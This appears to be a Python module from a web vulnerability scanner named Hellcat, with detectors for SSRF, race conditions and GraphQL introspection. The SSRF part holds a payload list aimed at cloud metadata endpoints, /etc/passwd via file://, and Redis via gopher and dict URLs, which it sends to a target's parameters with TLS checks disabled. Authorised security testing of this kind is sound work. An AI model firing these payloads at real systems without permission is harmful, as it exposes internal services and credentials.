"""
Hellcat Advanced Detectors — SSRF, Race Condition, GraphQL
==========================================================
"""
from __future__ import annotations

import concurrent.futures
import hashlib
import logging
import time
from typing import Any, Dict, List, Optional

from hellcat.core.detectors import BaseDetector, register_detector
from hellcat.core.models import DetectionResult, DetectorType, Severity

logger = logging.getLogger("hellcat.detectors.advanced")

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass


# ---------------------------------------------------------------------------
# SSRF Detector
# ---------------------------------------------------------------------------

SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost", "http://[::1]",
    "http://0.0.0.0", "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://2130706433",  # 127.0.0.1 as decimal
    "http://0x7f000001",  # 127.0.0.1 as hex
    "http://017700000001",  # octal
    "http://127.1", "http://127.0.0.1:22", "http://127.0.0.1:3306",
    "file:///etc/passwd", "dict://127.0.0.1:6379/INFO",
    "gopher://127.0.0.1:6379/_INFO",
]

SSRF_SIGNATURES = [
    "root:x:", "ami-id", "instance-id", "computeMetadata",
    "OpenSSH", "MySQL", "redis_version", "+OK",
]


@register_detector("ssrf", {"owasp": "A10:2021"})
class SSRFDetector(BaseDetector):
    name = "ssrf"
    description = "Server-Side Request Forgery detector with cloud metadata checks"
    vuln_type = "SSRF"
    severity = Severity.CRITICAL
    detector_type = DetectorType.REQUEST

    def detect(self, url: str, **kwargs: Any) -> List[DetectionResult]:
        self._log_start(url)
        results: List[DetectionResult] = []
        params = kwargs.get("params", {})
        url_params = [p for p in params if any(k in p.lower() for k in
                      ("url", "uri", "link", "src", "href", "path", "redirect", "callback",
                       "next", "target", "dest", "return", "fetch", "proxy", "img"))]
        if not url_params:
            url_params = list(params.keys())[:3]

        for param in url_params:
            for payload in SSRF_PAYLOADS[:8]:
                try:
                    test_params = dict(params)
                    test_params[param] = payload
                    resp = requests.get(url, params=test_params, timeout=8, verify=False)
                    for sig in SSRF_SIGNATURES:
                        if sig in resp.text:
                            results.append(self._create_result(
                                url, param=param, payload=payload,
                                evidence=f"SSRF signature: {sig}",
                                confidence=0.90, verified=True,
                                remediation="Validate/whitelist URLs, block internal IPs, disable unused protocols",
                            ))
                            break
                    if results:
                        break
                except Exception:
                    pass
            if results:
                break
        self._log_end(url, results)
        return results

    def get_payloads(self) -> List[str]:
        return list(SSRF_PAYLOADS)


# ---------------------------------------------------------------------------
# Race Condition Tester
# ---------------------------------------------------------------------------

@register_detector("race_condition")
class RaceConditionDetector(BaseDetector):
    name = "race_condition"
    description = "Race condition / TOCTOU detector via concurrent requests"
    vuln_type = "Race Condition"
    severity = Severity.HIGH
    detector_type = DetectorType.MISC

    def detect(self, url: str, **kwargs: Any) -> List[DetectionResult]:
        self._log_start(url)
        results: List[DetectionResult] = []
        method = kwargs.get("method", "GET")
        data = kwargs.get("data", {})
        headers = kwargs.get("headers", {})
        threads = kwargs.get("threads", 10)
        rounds = kwargs.get("rounds", 3)

        for rnd in range(rounds):
            responses = self._send_concurrent(url, method, data, headers, threads)
            if self._detect_anomaly(responses):
                results.append(self._create_result(
                    url, evidence=f"Round {rnd+1}: response variance detected in {threads} concurrent requests",
                    confidence=0.6,
                    remediation="Implement proper locking, use database transactions, add idempotency keys",
                    extra={"round": rnd+1, "responses": len(responses),
                           "unique_statuses": list({r[0] for r in responses}),
                           "size_variance": max(r[1] for r in responses) - min(r[1] for r in responses)},
                ))
                break
        self._log_end(url, results)
        return results

    def _send_concurrent(self, url: str, method: str, data: Dict,
                         headers: Dict, n: int) -> List[tuple]:
        def send_one(_: int) -> tuple:
            try:
                resp = requests.request(method, url, data=data or None,
                                        headers=headers or None, timeout=10, verify=False)
                return (resp.status_code, len(resp.content), hashlib.md5(resp.content).hexdigest()[:8])
            except Exception:
                return (0, 0, "error")

        with concurrent.futures.ThreadPoolExecutor(max_workers=n) as ex:
            return list(ex.map(send_one, range(n)))

    def _detect_anomaly(self, responses: List[tuple]) -> bool:
        if len(responses) < 2:
            return False
        statuses = {r[0] for r in responses}
        hashes = {r[2] for r in responses}
        sizes = [r[1] for r in responses]
        # Anomaly: different status codes, different body hashes, or large size variance
        return len(statuses) > 1 or len(hashes) > 1 or (max(sizes) - min(sizes)) > 200


# ---------------------------------------------------------------------------
# GraphQL Introspection Scanner
# ---------------------------------------------------------------------------

GRAPHQL_INTROSPECTION = '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'


@register_detector("graphql")
class GraphQLDetector(BaseDetector):
    name = "graphql"
    description = "GraphQL introspection and injection scanner"
    vuln_type = "GraphQL Misconfiguration"
    severity = Severity.MEDIUM
    detector_type = DetectorType.REQUEST

    ENDPOINTS = ["/graphql", "/graphiql", "/api/graphql", "/v1/graphql", "/query"]

    def detect(self, url: str, **kwargs: Any) -> List[DetectionResult]:
        self._log_start(url)
        results: List[DetectionResult] = []
        from urllib.parse import urlparse, urljoin
        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

        for ep in self.ENDPOINTS:
            test_url = urljoin(base, ep)
            try:
                # Introspection check
                resp = requests.post(test_url, data=GRAPHQL_INTROSPECTION,
                                     headers={"Content-Type": "application/json"},
                                     timeout=8, verify=False)
                if resp.status_code == 200 and "__schema" in resp.text:
                    try:
                        types = resp.json().get("data", {}).get("__schema", {}).get("types", [])
                        type_names = [t["name"] for t in types if not t["name"].startswith("__")][:20]
                    except Exception:
                        type_names = []
                    results.append(self._create_result(
                        test_url, evidence=f"GraphQL introspection enabled. Types: {type_names[:10]}",
                        confidence=0.95, verified=True,
                        remediation="Disable introspection in production, implement query depth limiting",
                        extra={"endpoint": ep, "types_found": len(type_names), "types": type_names},
                    ))
                    break
            except Exception:
                pass
        self._log_end(url, results)
        return results
